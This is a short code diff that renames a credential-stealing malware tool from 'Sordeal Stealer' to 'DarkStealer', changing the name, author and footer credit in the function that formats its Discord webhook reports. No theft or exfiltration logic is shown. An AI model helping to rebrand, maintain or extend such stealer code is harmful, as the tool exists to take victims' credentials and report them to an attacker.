@@ -58,7 +58,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Sordeal Stealer",
+        username: "DarkStealer",
         avatar_url: "https://raw.githubusercontent.com/ShamanOracle/Assets/main/sordeal.png",
         content: "",
         embeds: [{
@@ -67,10 +67,10 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "Sordeal"
+                name: "Dark"
             },
             footer: {
-                text: "©Shaman | https://github.com/SOrdeal/Sordeal-Stealer"
+                text: "DarkGamer"
             },
 
         }]
